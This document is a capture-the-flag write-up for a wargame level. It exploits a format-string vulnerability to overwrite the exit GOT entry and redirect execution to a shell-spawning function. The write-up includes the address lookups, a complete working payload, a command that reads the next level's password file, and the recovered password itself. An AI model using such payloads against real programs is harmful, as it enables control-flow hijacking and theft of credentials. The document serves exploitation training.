# Level 5 - GOT Overwrite via Format String

## Code Analysis

### Function Structure

The program contains two primary functions:

1. **main → n function:**
   - Uses `fgets` to read user input
   - Prints the input using `printf` (no format specifier - vulnerable)
   - Calls `exit` to terminate

2. **o function:**
   - Spawns a shell when executed
   - Never called in normal program flow

### The Challenge

Unlike previous levels, we cannot simply overwrite the return address because the functions never return - they call `exit` instead.

## Exploitation Strategy: GOT Overwrite

### Understanding the Global Offset Table (GOT)

The **GOT (Global Offset Table)** stores addresses of dynamically linked functions. When a program calls a function like `exit`, it actually jumps to the address stored in the GOT.

By overwriting the GOT entry for `exit` with the address of the `o` function, we redirect execution when `exit` is called.

## Finding Required Addresses

### Step 1: Locating the Exit GOT Entry

Using `objdump` to examine dynamic relocations:
```bash
objdump -R ./level5
```

**Output:**
```
08049838 R_386_JUMP_SLOT   _exit
```

**GOT address for exit:** `0x08049838`

**Little-endian representation:** `\x38\x98\x04\x08`

### Step 2: Finding the Address of Function o

From binary analysis:

**Address of function o:** `0x080484a4`

**Decimal representation:** 134513828

**Little-endian representation:** `\xa4\x84\x04\x08`

## Crafting the Exploit

### Step 1: Locating Stack Position

We determine where our input appears on the stack:
```bash
python -c 'print "BBBB" + "%x" * 10' > /tmp/exploit5
cat /tmp/exploit5 | ./level5
```

The pattern `42424242` ("BBBB") appears at the **4th position**.

### Step 2: Calculating Field Width

- Target value: 134513828 (address of `o`)
- GOT address contributes: 4 bytes
- Field width needed: 134513828 - 4 = **134513824**

### Step 3: Final Payload
```bash
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
```

**Payload breakdown:**
- `\x38\x98\x04\x08`: GOT address of `exit` (4 bytes)
- `%134513824d`: Dynamic field width to reach target value
- `%4$n`: Write byte count to the 4th stack position (GOT entry)

## Executing the Exploit
```bash
cat /tmp/exploit5 - | ./level5
```

**Note:** This exploit takes considerable time to execute due to the large field width being processed. Be patient while the format string handler prints the massive padding.

## Retrieving the Password

Once the shell spawns:
```bash
cat /home/user/level6/.pass
```

## Credentials

**Username:** level6  
**Password:** `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

## Summary

This level introduces **GOT overwrite techniques**, a powerful exploitation method that allows redirecting program execution by modifying function pointers in the Global Offset Table.

**Key concepts:**
- Understanding the Global Offset Table (GOT) structure
- Dynamic linking and function resolution
- Leveraging `objdump -R` for GOT analysis
- Overwriting function pointers through format string vulnerabilities
- Redirecting control flow without traditional return address manipulation
- Handling large numeric values in format string attacks

The GOT overwrite technique is particularly effective against programs that use `exit` or other non-returning functions, where traditional stack-based exploitation methods fail.